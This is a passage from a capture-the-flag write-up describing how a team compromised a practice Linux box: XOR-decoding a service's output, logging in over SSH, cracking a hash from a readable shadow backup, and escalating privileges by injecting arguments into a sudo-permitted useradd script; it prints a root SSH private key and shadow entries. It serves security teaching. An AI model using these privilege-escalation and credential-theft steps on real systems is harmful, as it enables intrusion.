+FjcWNyo2Oyw7FjcWN2Q4LDs6Oyw3PTVkEg1uKhINbx0MCzoUCjccDgsbCBELbxAXFxgcDQ0IBBwIGws5DW4IBBINbioSDW4VBzQQHTwZFCsKMC42DyQYJwkyNiw6GQwvDAsYHA8LGBwPNT1vOjMUKggLGBwPCxgYBzNuazoILgwPCxgcDwsYHA8LGBwPNRgcDwsYEDpuGBwPCxhuOzMTJwRtDD8IKS4MOwtrCwgGNg4LCxgcDwsQHQczDDMHCT1sBzMYMTwYNmoNbR8pCzMEGjwKMiQNbRAtBG8cbQQbKj89FjYyOjQILAhtMisEFgg3CwsYHA8LLhs6CTYVBAlmbTxvEAcdMBgcDwsYHA8GDGgHJBQwOhguBgsGMhEIGAhqCm8YHA8LGBoPMxQ1BDMYMBAzFDY/GSYHOxsqKRMYFDMPbG5rPW4qJDwZOg86bAwSCTAcagQGB28/bzprPDMMbwcyGxUPCxgcDAsQbD8LBCgMGC5vCwo2MAQnKjQJMxNuCDQUFwsLEG0RGDIQBwguNToYBAkSbRAKEG4QLTxsDA8/C28tOhobaz0LDCk6FhgWCDMEGD0Jaw0MNDYSBzQUbT0PLmsIbhsoDzQcKTwJaxkQN2cqCzMUEgQaF286GxgcDwsYGhNuLhwHJBAJP2wXJAQWBDcTMhRsDwgYFA4PMSoSDW4qEgsIEQwdHA4LGwgRC28QFxcYHA0NCAQcCBsLOQ1uCAQSDW4qEg1uFWR2bHJvZmdsZ2xuam5pZ21mamZrZmlsZ21oa2pqbG1saGpmb21mZ2xuanc=
+goodbye!
+</code></pre><p>We did this a few more times until one of us decided to compare some in hex:</p>
+<pre tabindex="0"><code>16 37 16 37 2a 36 3b 2c 3b 16 37 16 37 64 38 2c 3b 3a 3b 2c 37 3d 35 64 12 0d 6e 2a 12 0d 6f 1d 0c 0b 3a 14 0a 37 1c 0e 0b 1b 08 11 0b 6f 10 17 17 18 1c 0d 0d 08 04 1c 08 1b 0b 39 0d 6e 08 04 12 0d 6e 2a 12 0d 6e 15 07 34 10 1d 3c 19 14 2b 0a 30 2e 36 0f 24 18 27 09 32 36 2c 3a 19 0c 2f 0c 0b 18 1c 0f 0b 18 1c 0f 35 3d 6f 3a 33 14 2a 08 0b 18 1c 0f 0b 18 18 07 33 6e 6b 3a 08 2e 0c 0f 0b 18 1c 0f 0b 18 1c 0f 0b 18 1c 0f 35 18 1c 0f 0b 18 10 3a 6e 18 1c 0f 0b 18 6e 3b 33 13 27 04 6d 0c 3f 08 29 2e 0c 3b 0b 6b 0b 08 06 36 0e 0b 0b 18 1c 0f 0b 10 1d 07 33 0c 33 07 09 3d 6c 07 33 18 31 3c 18 36 6a 0d 6d 1f 29 0b 33 04 1a 3c 0a 32 24 0d 6d 10 2d 04 6f 1c 6d 04 1b 2a 3f 3d 16 36 32 3a 34 08 2c 08 6d 32 2b 04 16 08 37 0b 0b 18 1c 0f 0b 2e 1b 3a 09 36 15 04 09 66 6d 3c 6f 10 07 1d 30 18 1c 0f 0b 18 1c 0f 06 0c 68 07 24 14 30 3a 18 2e 06 0b 06 32 11 08 18 08 6a 0a 6f 18 1c 0f 0b 18 1a 0f 33 14 35 04 33 18 30 10 33 14 36 3f 19 26 07 3b 1b 2a 29 13 18 14 33 0f 6c 6e 6b 3d 6e 2a 24 3c 19 3a 0f 3a 6c 0c 12 09 30 1c 6a 04 06 07 6f 3f 6f 3a 6b 3c 33 0c 6f 07 32 1b 15 0f 0b 18 1c 0c 0b 10 6c 3f 0b 04 28 0c 18 2e 6f 0b 0a 36 30 04 27 2a 34 09 33 13 6e 08 34 14 17 0b 0b 10 6d 11 18 32 10 07 08 2e 35 3a 18 04 09 12 6d 10 0a 10 6e 10 2d 3c 6c 0c 0f 3f 0b 6f 2d 3a 1a 1b 6b 3d 0b 0c 29 3a 16 18 16 08 33 04 18 3d 09 6b 0d 0c 34 36 12 07 34 14 6d 3d 0f 2e 6b 08 6e 1b 28 0f 34 1c 29 3c 09 6b 19 10 37 67 2a 0b 33 14 12 04 1a 17 6f 3a 1b 18 1c 0f 0b 18 1a 13 6e 2e 1c 07 24 10 09 3f 6c 17 24 04 16 04 37 13 32 14 6c 0f 08 18 14 0e 0f 31 2a 12 0d 6e 2a 12 0b 08 11 0c 1d 1c 0e 0b 1b 08 11 0b 6f 10 17 17 18 1c 0d 0d 08 04 1c 08 1b 0b 39 0d 6e 08 04 12 0d 6e 2a 12 0d 6e 15 64 76 6c 72 6f 66 67 6c 67 6c 6e 6a 6e 69 67 6d 66 6a 66 6b 66 69 6c 67 6d 68 6b 6a 6a 6c 6d 6c 68 6a 66 6f 6d 66 67 6c 6e 6a 77
+</code></pre><pre tabindex="0"><code>81 a0 81 a0 bd a1 ac bb ac 81 a0 81 a0 f3 af bb ac ad ac bb a0 aa a2 f3 85 9a f9 bd 85 9a f8 8a 9b 9c ad 83 9d a0 8b 99 9c 8c 9f 86 9c f8 87 80 80 8f 8b 9a 9a 9f 93 8b 9f 8c 9c ae 9a f9 9f 93 85 9a f9 bd 85 9a f9 82 90 a3 87 8a ab 8e 83 bc 9d a7 b9 a1 98 b3 8f b0 9e a5 a1 bb ad 8e 9b b8 9b 9c 8f 8b 98 9c 8f 8b 98 a2 aa f8 ad a4 83 bd 9f 9c 8f 8b 98 9c 8f 8f 90 a4 f9 fc ad 9f b9 9b 98 9c 8f 8b 98 9c 8f 8b 98 9c 8f 8b 98 a2 8f 8b 98 9c 8f 87 ad f9 8f 8b 98 9c 8f f9 ac a4 84 b0 93 fa 9b a8 9f be b9 9b ac 9c fc 9c 9f 91 a1 99 9c 9c 8f 8b 98 9c 87 8a 90 a4 9b a4 90 9e aa fb 90 a4 8f a6 ab 8f a1 fd 9a fa 88 be 9c a4 93 8d ab 9d a5 b3 9a fa 87 ba 93 f8 8b fa 93 8c bd a8 aa 81 a1 a5 ad a3 9f bb 9f fa a5 bc 93 81 9f a0 9c 9c 8f 8b 98 9c b9 8c ad 9e a1 82 93 9e f1 fa ab f8 87 90 8a a7 8f 8b 98 9c 8f 8b 98 91 9b ff 90 b3 83 a7 ad 8f b9 91 9c 91 a5 86 9f 8f 9f fd 9d f8 8f 8b 98 9c 8f 8d 98 a4 83 a2 93 a4 8f a7 87 a4 83 a1 a8 8e b1 90 ac 8c bd be 84 8f 83 a4 98 fb f9 fc aa f9 bd b3 ab 8e ad 98 ad fb 9b 85 9e a7 8b fd 93 91 90 f8 a8 f8 ad fc ab a4 9b f8 90 a5 8c 82 98 9c 8f 8b 9b 9c 87 fb a8 9c 93 bf 9b 8f b9 f8 9c 9d a1 a7 93 b0 bd a3 9e a4 84 f9 9f a3 83 80 9c 9c 87 fa 86 8f a5 87 90 9f b9 a2 ad 8f 93 9e 85 fa 87 9d 87 f9 87 ba ab fb 9b 98 a8 9c f8 ba ad 8d 8c fc aa 9c 9b be ad 81 8f 81 9f a4 93 8f aa 9e fc 9a 9b a3 a1 85 90 a3 83 fa aa 98 b9 fc 9f f9 8c bf 98 a3 8b be ab 9e fc 8e 87 a0 f0 bd 9c a4 83 85 93 8d 80 f8 ad 8c 8f 8b 98 9c 8f 8d 84 f9 b9 8b 90 b3 87 9e a8 fb 80 b3 93 81 93 a0 84 a5 83 fb 98 9f 8f 83 99 98 a6 bd 85 9a f9 bd 85 9c 9f 86 9b 8a 8b 99 9c 8c 9f 86 9c f8 87 80 80 8f 8b 9a 9a 9f 93 8b 9f 8c 9c ae 9a f9 9f 93 85 9a f9 bd 85 9a f9 82 f3 e1 fb e5 f8 f1 f0 fb f0 fb f9 fd f9 fe f0 fa f1 fd f1 fc f1 fe fb f0 fa ff fc fd fd fb fa fb ff fd f1 f8 fa f1 f0 fb f9 fd e0
+</code></pre><p>This is interesting! We can see that the first 4 bytes repeat! <code>16 37 16 37</code> and <code>81 a0 81 a0</code>.  Our <del>god-like guess skills</del> intuition told us that this is being XORed with a random key, so let&rsquo;s bruteforce our way to solution:</p>
+<pre tabindex="0"><code>Key = 01: iHithereHiHi:frederick:LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0emMyZ3RaVwpReU5UVXhPUUFBQUNCYmRmYWc2YmFobFh4S3AwUmZDbTlzS3NsZ1B3ZEtacHhldjVrV3luZHViUUFBQUpEdWhKZW83b1NYCnFBQUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDQmJkZmFnNmJhaGxYeEtwMFJmQ205c0tzbGdQd2RLWnB4ZXY1a1d5bmR1YlEKQUFBRUN2aUZvRFp1UThnZytjWmM0VjJIUUN3OFlNYVpkdFZWL3NTN0Nsb2RQaU1sdDE5cURwdHFHVmZFcW5SRjhLYjJ3cQp5V0EvQjBwbW5GNi9tUmJLZDI1dEFBQUFDM0pBYzNWa2IzZHZiMlJ2QVFJPQotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K:(2,18929204079384858729365442326481389204)
+</code></pre><p>We get the first flag: <code>(2,18929204079384858729365442326481389204)</code>, sweet. We also have a name <code>fredercik</code>, along with a long string that sort of looks like a key when you convert it to base64, but we&rsquo;ll save that for in a bit.</p>
+<p>Connecting to the other port, port 13337, we see that it&rsquo;s actually just OpenSSH. So let&rsquo;s try to connect to it with that name and key we got from the last step to see if we can get into the box.</p>
+<pre tabindex="0"><code>$ ssh -i key frederick@3.138.157.23 -p 13337
+
+$ whoami
+Frederick
+</code></pre><p>Alright, we are in! Right away we see two files in Fred&rsquo;s home directory: <code>password_guide</code> and <code>top_100_password_ideas</code>. Cating out <code>password_guide</code> we see:</p>
+<pre tabindex="0"><code>Hi,
+
+To make a strong password, pick one from the list I included and add 2 digits onto the end!
+</code></pre><p>Neat, so it seems like their &ldquo;strong password&rdquo; is just going to be one of the hundred in that list + 2 digits, which to brute force is only 10,000 passwords.  But what will be be brute forcing exactly?</p>
+<p>After doing some more enumeration on the box, we notice that Frederick has read access to <code>shadow.bak</code>, a backup of the file that stores the encrypted passwords for all users. Taking a look at this gives us a pretty good idea of what password we need to crack:</p>
+<pre tabindex="0"><code>root:!(5,27562576550131620089134738750424271702):18644:0:99999:7:::
+daemon:*:18644:0:99999:7:::
+bin:*:18644:0:99999:7:::
+sys:*:18644:0:99999:7:::
+sync:*:18644:0:99999:7:::
+games:*:18644:0:99999:7:::
+man:*:18644:0:99999:7:::
+lp:*:18644:0:99999:7:::
+mail:*:18644:0:99999:7:::
+news:*:18644:0:99999:7:::
+uucp:*:18644:0:99999:7:::
+proxy:*:18644:0:99999:7:::
+www-data:*:18644:0:99999:7:::
+backup:*:18644:0:99999:7:::
+list:*:18644:0:99999:7:::
+irc:*:18644:0:99999:7:::
+gnats:*:18644:0:99999:7:::
+nobody:*:18644:0:99999:7:::
+_apt:*:18644:0:99999:7:::
+systemd-timesync:*:18644:0:99999:7:::
+systemd-network:*:18644:0:99999:7:::
+systemd-resolve:*:18644:0:99999:7:::
+messagebus:*:18644:0:99999:7:::
+sshd:*:18644:0:99999:7:::
+systemd-coredump:!!:18644::::::
+frederick:!:18683:0:99999:7:::
+oldadmin:$6$S73ABQAuFHt.hyVw$2SB2MgTdEf5W2exQzr4kpgpvZ30lUubEPGlNkKlXYLxbPn7TG1IFh9aBzZrJ4VfYcymewmwJaW9WC3RKUVZKx/:18683:0:99999:7:::
+</code></pre><p>Not only that, but we get our second flag! <code>(5,27562576550131620089134738750424271702)</code></p>
+<p>So at this point it&rsquo;s clear that we need to get access to oldadmin. We can use johntheripper with our knowledge of how the passwords are choosen to quickly crack the pass:</p>
+<p>After tinkering with john for a bit, we were eventually able to recover the password: <code>freedom42</code>. We now are able to SU to oldadmin with that password :)</p>
+<p>As <code>oldadmin</code>, we continued to do a bit more enumeration. Looking through /etc/, we were able to cat out the <code>sudoers</code> files:</p>
+<pre tabindex="0"><code>#
+# This file MUST be edited with the &#39;visudo&#39; command as root.
+#
+# Please consider adding local content in /etc/sudoers.d/ instead of
+# directly modifying this file.
+#
+# See the man page for details on how to write a sudoers file.
+#
+Defaults        env_reset
+Defaults        mail_badpass
+Defaults        secure_path=&#34;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&#34;
+
+# Host alias specification
+
+# User alias specification
+
+# Cmnd alias specification
+
+# User privilege specification
+root    ALL=(ALL:ALL) ALL
+
+# Allow members of group sudo to execute any command
+
+%sudo   ALL=(ALL:ALL) ALL
+
+
+oldadmin ALL=(root) NOPASSWD:/root/script/adopt_dog
+# See sudoers(5) for more information on &#34;#include&#34; directives:
+
+#includedir /etc/sudoers.d
+</code></pre><p>Seems like as oldadmin we can run <code>/root/script/adopt_dog</code> without needing root&rsquo;s password! Let&rsquo;s check that out:</p>
+<pre tabindex="0"><code>#!/bin/bash
+
+userdel dog
+rm -rf /home/dog
+
+ARGS=$(echo &#34;$@&#34; | tr &#34;\\\\()&lt;&gt;\`&#34; &#34; &#34;)
+
+groupadd dog
+useradd -g dog $ARGS -g dog -G dog -m -d /home/dog dog
+</code></pre><p>This script seems to take in any number of arguments (minus a few special blacklist characters), and then runs them with <code>useradd</code> to create a new user <code>dog</code>.  Trying it out, we do see that it does indeed create that dog user and a home directory for it, but how do we <em>become</em> the dog? Well, since we have control over the arguments that are excecuted, we can just provide it with the encrypted password and then SU into the new user. Let&rsquo;s try it out:</p>
+<pre tabindex="0"><code>$ sudo ./adopt_dog -p $(echo &#34;boop&#34; | openssl passwd -1 -stdin)
+$ su dog
+Password:
+$ whoami
+dog
+</code></pre><p>Neato! We are now a dog <del>my wildest dreams have come true</del>. What can we do with our newfound powers? Well, we can go check out our home!</p>
+<p>Going to our home directory, we see&hellip;. a flag? <code>(6,103859969563713920733890450469614298693)</code>.</p>
+<p>That&rsquo;s great and all, but where in the world did it come from? The script we ran didn&rsquo;t move anything into the home directory, and there is no cron job that&rsquo;s updating this directory with the flag.  Well it&rsquo;s because of <code>/etc/skel</code>, which is one of the open parameters in the adopt_dog script. So the script checks <code>/etc/skel</code> by default, and anything in that directory get&rsquo;s placed into dog&rsquo;s home directory. Since we have control over that parameter, we can actually tell the script to include any directory we want with <code>--skel</code> and we will be able to read it! Let&rsquo;s do it with the root directory and see if we can get root&rsquo;s private ssh keys.</p>
+<p>SUing into dog again, we can now view all of root&rsquo;s files, including a <code>flag</code> file in their <code>.ssh</code> directory! <code>(7,115317666936746434141387300928816667814)</code></p>
+<p>We also have root&rsquo;s private keys, so we can just ssh into root whenever we want, sweet!</p>
+<pre tabindex="0"><code>-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+QyNTUxOQAAACA8/OKb2sIToYOGTKGRNcUTYFLZF+cp7JVqqWioCrfWAgAAAJBRR7KIUUey
+iAAAAAtzc2gtZWQyNTUxOQAAACA8/OKb2sIToYOGTKGRNcUTYFLZF+cp7JVqqWioCrfWAg
+AAAECMbmo1F61KDqpoOr0f7JKJ0+dmSZuVZETjuQfWyDhhajz84pvawhOhg4ZMoZE1xRNg
+UtkX5ynslWqpaKgKt9YCAAAAC3JAc3Vkb3dvb2RvAQI=
+-----END OPENSSH PRIVATE KEY-----
+</code></pre><p>Checking out the rest of root&rsquo;s files, we get another flag in <code>.bashrc</code>: <code>(1,41771917274972003437877223622233833933)</code> (This one had us stumped for a bit, our inner guess gods let us down on this one)</p>
+<p>We also did a bit more enumeration, specifically on the services that were running, and we found that there was running service on port 1338 that could only be reached through the localhost.  Netcating to that service gave us our second to last flag! <code>(3,66827439388718004166721471471671102060)</code></p>
+<p>At this point, we have done pretty much everything we could without root privilages, so let&rsquo;s use that key we got earlier to ssh into root.</p>
+<p>After even more enumeration and random guessing later, we found that root has access to the a file <code>/opt/what/this/is/interesting/follow/this/path/to/get/a/flag/where/does/it/end/wow/this/is/taking/a/while/hmm/okay/tap/tap/tap/tap/tap/tap/hmm/here/you/go/lol/flag</code>. A bunch of tabs presses later, and we get our last flag:  <code>(4,121577997023255799331813434873849479391)</code></p>
+<p>Phew! We can now put all these flags in shares.cvs, run the python script to decrypt the flag, and BOOM:</p>
+<pre tabindex="0"><code>osu{Shamir_makes_me_sad_but_linux_scavenger_hunt_makes_me_glad}
+</code></pre><p>Woop!</p>
+
+        </div>
+        
+        
+
+        
+        
+
+          
+      </div>
+     
+      
+      
+        
+        
+      <script>
+        var oid = "views_posts\/1716569287759-boxy\/index.md"
+        var oid_likes = "likes_posts\/1716569287759-boxy\/index.md"
+      </script>
+      
+      
+      
+      <script type="text/javascript" src="/js/page.min.b06a29d42a4ed16787978e2eee1e8c797b7698db2bc14ccee78f5c80ac566fc996190a73ad80a5e987558474b20b96fa38f7d85b405f165ff72b7b163c5ad11b.js" integrity="sha512-sGop1CpO0WeHl44u7h6MeXt2mNsrwUzO549cgKxWb8mWGQpzrYCl6YdVhHSyC5b6OPfYW0BfFl/3K3sWPFrRGw=="></script>
+  
+    </section>
+  <footer class="pt-8 max-w-prose print:hidden">
+
+    
+  
+    
+    
+    
+    <div class="pt-8">
+      <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
+      <div class="flex justify-between pt-3">
+        <span>
+          
+            <a class="flex group mr-3" href="/posts/1716571871952-rayhanns_return/">
+              <span
+                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
+                >&larr;</span
+              >
+              <span
+                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
+                >&rarr;</span
+              >
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >OSU League 2020/2021 - rayhanns_return Writeup</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2021-02-22 00:00:00 &#43;0000 UTC">22 February 2021</time>
+                  
+                </span>
+              </span>
+            </a>
+          
+        </span>
+        <span>
+          
+            <a class="flex text-right group ml-3" href="/posts/1716572461312-web3/">
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >OSU League 2020/2021 - WEB_THREE</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2021-03-07 00:00:00 &#43;0000 UTC">7 March 2021</time>
+                  
+                </span>
+              </span>
+              <span
+                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
+                >&rarr;</span
+              >
+              <span
+                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
+                >&larr;</span
+              >
+            </a>
+          
+        </span>
+      </div>
+    </div>
+  
+
+
+    
+  </footer>
+</article>
+
+      <div id="top-scroller" class="pointer-events-none absolute top-[110vh] bottom-0 w-12 ltr:right-0 rtl:left-0">
+  <a href="#the-top"
+    class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 mb-16 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+    aria-label="Scroll to top" title="Scroll to top">
+    &uarr;
+  </a>
+</div>
+    </main><footer id="site-footer" class="py-10 print:hidden">
+  
+  
+    
+    <nav class="flex flex-row pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400">
+      <ul class="flex flex-col list-none sm:flex-row">
+        
+        <li class="flex mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0">
+          <a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center" href=""
+            title="">
+            
+            
+          </a>
+        </li>
+        
+      </ul>
+    </nav>
+    
+  
+  <div class="flex items-center justify-between">
+
+    
+    
+    <p class="text-sm text-neutral-500 dark:text-neutral-400">
+      &copy;
+      2024
+      Cameron McCawley
+    </p>
+    
+
+    
+    
+    <p class="text-xs text-neutral-500 dark:text-neutral-400">
+      
+      
+      Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+        href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+        href="https://blowfish.page/" target="_blank" rel="noopener noreferrer">Blowfish</a>
+    </p>
+    
+
+  </div>
+  <script>
+    
+    mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
+      margin: 24,
+      background: 'rgba(0,0,0,0.5)',
+      scrollOffset: 0,
+    })
+    
+  </script>
+  
+  
+  <script type="text/javascript" src="/js/process.min.62060bb247f4de2b6dde45903668fefb68d792f365587605177b1227c0cf43588701edaca0cb40e2c8e2789bd5ce67c1d2a215b9fb258c3496a7cd25e7cb5fdf.js" integrity="sha512-YgYLskf03itt3kWQNmj&#43;&#43;2jXkvNlWHYFF3sSJ8DPQ1iHAe2soMtA4sjieJvVzmfB0qIVufsljDSWp80l58tf3w=="></script>
+  
+  
+</footer><div
+  id="search-wrapper"
+  class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh]"
+  data-url="https://example.org/"
+  style="z-index:500"
+>
+  <div
+    id="search-modal"
+    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800"
+  >
+    <header class="relative z-10 flex items-center justify-between flex-none px-2">
+      <form class="flex items-center flex-auto min-w-0">
+        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
+          
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+        </div>
+        <input
+          type="search"
+          id="search-query"
+          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent"
+          placeholder="Search"
+          tabindex="0"
+        />
+      </form>
+      <button
+        id="close-search-button"
+        class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+        title="Close (Esc)"
+      >
+        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+
+  </span>
+
+
+      </button>
+    </header>
+    <section class="flex-auto px-2 overflow-auto">
+      <ul id="search-results">
+        
+      </ul>
+    </section>
+  </div>
+</div>
+
+  </div>
+</body>
+
+</html>
